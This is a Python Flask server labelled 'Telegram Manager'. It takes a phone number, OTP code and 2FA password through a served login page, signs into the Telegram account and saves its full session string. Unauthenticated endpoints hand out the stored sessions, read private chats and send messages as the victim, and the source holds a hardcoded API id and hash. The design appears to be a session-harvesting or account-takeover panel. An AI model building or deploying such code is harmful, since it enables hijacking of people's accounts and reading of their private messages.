from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import json
import os
import asyncio
import nest_asyncio
from datetime import datetime

# Apply nest_asyncio for Render
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# Your API credentials
api_id = 33465589
api_hash = '08bdab35790bf1fdf20c16a50bd323b8'

# Store temporary data for OTP
temp_data = {}

# Store accounts persistently
accounts = []
if os.path.exists('accounts.json'):
    try:
        with open('accounts.json', 'r') as f:
            accounts = json.load(f)
        print(f"✅ Loaded {len(accounts)} accounts")
    except Exception as e:
        print(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    with open('accounts.json', 'w') as f:
        json.dump(accounts, f, indent=2)

# Helper to run async functions
def run_async(coro):
    """Run async coroutine in a new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

@app.route('/')
def serve_login():
    return send_file('login.html')

@app.route('/dashboard')
def serve_dashboard():
    return send_file('dashboard.html')

# -------------------- SEND OTP --------------------
@app.route('/api/add-account', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    
    async def send_code():
        client = None
        try:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            result = await client.send_code_request(phone)
            session_str = client.session.save()
            return {'success': True, 'phone_code_hash': result.phone_code_hash, 'session_str': session_str}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Too many requests. Try again after {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        result = run_async(send_code())
        
        if not result.get('success'):
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
        
        session_id = str(int(datetime.now().timestamp()))
        temp_data[session_id] = {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_str': result['session_str']
        }
        print(f"📱 OTP sent to {phone}")
        return jsonify({'success': True, 'session_id': session_id})
    except Exception as e:
        print(f"Error in send_otp: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- VERIFY OTP --------------------
@app.route('/api/verify-code', methods=['POST'])
def verify_otp():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Code and session ID required'})
    
    if session_id not in temp_data:
        return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
    
    session = temp_data[session_id]
    phone = session['phone']
    phone_code_hash = session['phone_code_hash']
    session_str = session['session_str']
    
    async def verify():
        client = None
        try:
            client = TelegramClient(StringSession(session_str), api_id, api_hash)
            await client.connect()
            
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            except errors.SessionPasswordNeededError:
                if password:
                    await client.sign_in(password=password)
                else:
                    return {'success': False, 'need_password': True}
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code. Please try again.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Please request a new code.'}
            
            me = await client.get_me()
            string_session = client.session.save()
            
            return {
                'success': True, 
                'me': {
                    'id': me.id,
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'username': me.username or '',
                    'phone': me.phone or phone
                }, 
                'string_session': string_session
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if result.get('need_password'):
            return jsonify({'success': False, 'need_password': True})
        
        if not result.get('success'):
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
        
        me = result['me']
        string_session = result['string_session']
        
        # Check if account already exists
        existing_account = next((a for a in accounts if a.get('phone') == phone or a.get('user_id') == me['id']), None)
        
        if existing_account:
            # Update existing account
            existing_account['name'] = f"{me['first_name']} {me['last_name']}".strip() or "User"
            existing_account['username'] = me['username']
            existing_account['session'] = string_session
            existing_account['date'] = str(datetime.now())
            account = existing_account
        else:
            # Create new account
            account = {
                'id': len(accounts) + 1,
                'user_id': me['id'],
                'phone': phone,
                'name': f"{me['first_name']} {me['last_name']}".strip() or "User",
                'username': me['username'],
                'session': string_session,
                'date': str(datetime.now())
            }
            accounts.append(account)
        
        save_accounts()
        
        # Clean up temp data
        if session_id in temp_data:
            del temp_data[session_id]
        
        print(f"✅ Account added/updated: {phone}")
        return jsonify({'success': True, 'account': account})
        
    except Exception as e:
        print(f"Error in verify_otp: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- GET ACCOUNTS --------------------
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    account_list = [{
        'id': a['id'],
        'phone': a['phone'],
        'name': a['name'],
        'username': a.get('username', ''),
        'session': a.get('session', a.get('string_session', ''))
    } for a in accounts]
    return jsonify({'success': True, 'accounts': account_list})

# -------------------- DELETE ACCOUNT --------------------
@app.route('/api/accounts/<int:account_id>', methods=['DELETE'])
def delete_account(account_id):
    global accounts
    accounts = [a for a in accounts if a['id'] != account_id]
    save_accounts()
    return jsonify({'success': True})

# -------------------- GET CHATS AND MESSAGES --------------------
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    if not session_string:
        return jsonify({'success': False, 'error': 'No session found for this account'})
    
    async def fetch():
        client = None
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            
            # Check if authorized
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired. Please add account again.'}
            
            # Get dialogs (chats)
            dialogs = await client.get_dialogs(limit=50)
            
            chats = []
            all_messages = []
            
            for dialog in dialogs:
                # Get chat info
                if dialog.is_user:
                    # Private chat
                    if dialog.entity:
                        name = dialog.entity.first_name or ''
                        if dialog.entity.last_name:
                            name += f" {dialog.entity.last_name}"
                        if not name.strip():
                            name = dialog.entity.username or 'Unknown'
                    else:
                        name = 'Unknown'
                elif dialog.is_group or dialog.is_channel:
                    # Group or channel
                    name = dialog.name or 'Unknown'
                else:
                    name = 'Unknown'
                
                chat_id = str(dialog.id)
                
                # Get last message
                last_msg = ''
                last_msg_date = None
                if dialog.message and dialog.message.text:
                    last_msg = dialog.message.text[:100]
                    last_msg_date = dialog.message.date.timestamp() if dialog.message.date else None
                
                chats.append({
                    'id': chat_id,
                    'title': name,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': last_msg,
                    'lastMessageDate': last_msg_date
                })
                
                # Get last 20 messages for this chat
                try:
                    msgs = await client.get_messages(dialog.entity, limit=20)
                    for msg in msgs:
                        if msg and msg.text:  # Only store text messages
                            all_messages.append({
                                'chatId': chat_id,
                                'text': msg.text,
                                'date': msg.date.timestamp() if msg.date else 0,
                                'out': msg.out or False,
                                'id': msg.id
                            })
                except Exception as e:
                    print(f"Error getting messages for chat {chat_id}: {e}")
                    continue
            
            # Sort messages by date
            all_messages.sort(key=lambda x: x['date'])
            
            return {
                'success': True, 
                'chats': chats, 
                'messages': all_messages
            }
            
        except Exception as e:
            print(f"Error in fetch: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        result = run_async(fetch())
        
        if result.get('success'):
            return jsonify({
                'success': True, 
                'chats': result['chats'], 
                'messages': result['messages']
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to fetch messages')})
            
    except Exception as e:
        print(f"Error in get_messages: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- SEND MESSAGE --------------------
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not all([account_id, chat_id, message]):
        return jsonify({'success': False, 'error': 'Account ID, chat ID, and message are required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_string = account.get('session', account.get('string_session', ''))
    
    async def send():
        client = None
        try:
            client = TelegramClient(StringSession(session_string), api_id, api_hash)
            await client.connect()
            
            # Check if authorized
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Session expired. Please add account again.'}
            
            # Try to get entity by ID or username
            try:
                # Try as integer ID first
                entity = await client.get_entity(int(chat_id))
            except (ValueError, TypeError):
                # Try as string (username or phone)
                entity = await client.get_entity(chat_id)
            
            sent_msg = await client.send_message(entity, message)
            
            return {
                'success': True,
                'message': {
                    'id': sent_msg.id,
                    'text': sent_msg.text,
                    'date': sent_msg.date.timestamp() if sent_msg.date else 0,
                    'out': True
                }
            }
        except Exception as e:
            print(f"Error sending message: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            if client:
                await client.disconnect()
    
    try:
        result = run_async(send())
        
        if result.get('success'):
            return jsonify({'success': True, 'message': result['message']})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send message')})
            
    except Exception as e:
        print(f"Error in send_message: {e}")
        return jsonify({'success': False, 'error': str(e)})

# -------------------- REMOVE ACCOUNT --------------------
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    accounts = [a for a in accounts if a['id'] != account_id]
    save_accounts()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('📱 TELEGRAM MANAGER - FIXED VERSION')
    print('='*50)
    print(f'✅ Loaded {len(accounts)} accounts')
    print(f'✅ Server running on port {port}')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port, debug=True)
